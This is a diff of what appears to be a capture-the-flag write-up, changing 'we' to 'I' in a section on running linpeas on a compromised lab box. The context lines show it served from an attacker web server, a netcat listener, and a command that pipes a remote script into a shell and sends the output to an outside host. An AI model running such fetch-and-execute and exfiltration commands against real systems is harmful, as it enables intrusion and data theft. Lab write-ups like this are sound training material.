@@ -270,9 +270,9 @@ drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
 drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
 ```
 
-Once inside the box, we need to run linpeas.
+Once inside the box, I need to run linpeas.
 
-To do this, we first need to serve linpeas:
+To do this, I first need to serve linpeas:
 ```
 #!/bin/bash
 
@@ -286,12 +286,12 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 8888
 ```
 
-Before running it, we need to setup a listener for the incoming data:
+Before running it, I need to setup a listener for the incoming data:
 ```
 nc -lvnp 9999 > linpeas.out
 ```
 
-Once that's done, we download linpeas on the box from the attacker web server and run it from memory, sending the output to the attacker machine:
+Once that's done, I download linpeas on the box from my machine web server and run it from memory, sending the output to my machine:
 ```
 curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999
 ```
